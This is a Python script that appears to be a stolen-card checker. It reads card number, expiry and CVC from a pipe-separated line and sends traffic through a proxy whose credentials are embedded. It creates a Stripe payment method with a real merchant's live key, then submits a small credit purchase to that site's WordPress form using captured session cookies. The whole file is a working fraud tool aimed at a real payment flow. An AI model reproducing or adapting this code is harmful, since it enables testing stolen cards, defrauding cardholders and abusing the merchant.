import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&referrer=https%3A%2F%2Fapp.humandesign.ai&time_on_page=28381&key=pk_live_51Mo1qRKVuUdE4IV3ntE3UtSx3RX9HJ4f1qbXLDnnYIAE6sNvbE6YR60LxVeKY3GnaQ4Wbf04gOt59ON1Wnt8e2qc00MuzLyuAJ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'timezone_offset': '-420',
	    'mwai_session_id': '6800786a20721',
	    'pmpro_visit': '1',
	    'docs_visited_562123': '1',
	    'cf_clearance': 'gn65iQcufyqo1dnhtpciNWsnWv715IFC1f9cmccC1uQ-1744861293-1.2.1.1-xPVjGyP5gEOVftWIAw7uIpYtzkyF10PFu7Bk20HriMRAxQ4Txv9_9vSxj9FbRFSS4tdBb1c16E7ODmkSVR0AhNkIjzE4W4feOJVwVpPpYnQsACvmqZvYHaq8Ryk4GQmhNzHLqLaszyHv_7J3M.cY5uUwej7.gKNlzg6DLc.DdtuTOfZvTWU.VKfXsZYNUtR2AD2_rPJi2iCHhFi8iY9ill1DCDAWAc0225LLca4xVkfepDI_V_7Z_8tjuILTsrBbOzeAxdF_nNF1O__xLaoWN_3gpTF_9etkFBLzKEwwko4lbhGqA0ZYU9kNgzHVm_ZHWalllo4O8TFh78mlr0LPJ0DT3s2BxapdFrWx30AYAfc',
	    '__stripe_mid': 'e9add52a-abb1-4d2c-a50a-45a5bfe7c278ee3fc5',
	    '__stripe_sid': '8d492219-e0ba-433b-8248-51a1aea60f055fcd2b',
	}
	
	headers = {
	    'authority': 'app.humandesign.ai',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'timezone_offset=-420; mwai_session_id=6800786a20721; pmpro_visit=1; docs_visited_562123=1; cf_clearance=gn65iQcufyqo1dnhtpciNWsnWv715IFC1f9cmccC1uQ-1744861293-1.2.1.1-xPVjGyP5gEOVftWIAw7uIpYtzkyF10PFu7Bk20HriMRAxQ4Txv9_9vSxj9FbRFSS4tdBb1c16E7ODmkSVR0AhNkIjzE4W4feOJVwVpPpYnQsACvmqZvYHaq8Ryk4GQmhNzHLqLaszyHv_7J3M.cY5uUwej7.gKNlzg6DLc.DdtuTOfZvTWU.VKfXsZYNUtR2AD2_rPJi2iCHhFi8iY9ill1DCDAWAc0225LLca4xVkfepDI_V_7Z_8tjuILTsrBbOzeAxdF_nNF1O__xLaoWN_3gpTF_9etkFBLzKEwwko4lbhGqA0ZYU9kNgzHVm_ZHWalllo4O8TFh78mlr0LPJ0DT3s2BxapdFrWx30AYAfc; __stripe_mid=e9add52a-abb1-4d2c-a50a-45a5bfe7c278ee3fc5; __stripe_sid=8d492219-e0ba-433b-8248-51a1aea60f055fcd2b',
	    'origin': 'https://app.humandesign.ai',
	    'referer': 'https://app.humandesign.ai/docs/understanding-human-design-report-credits/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744861320721',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=562123&_fluentform_73_fluentformnonce=d938d26535&_wp_http_referer=%2Fdocs%2Funderstanding-human-design-report-credits%2F&dropdown=1&1_credit=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '73',
	}
	
	r2 = session.post(
	    'https://app.humandesign.ai/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	result2 = r2.text
	return result2
	

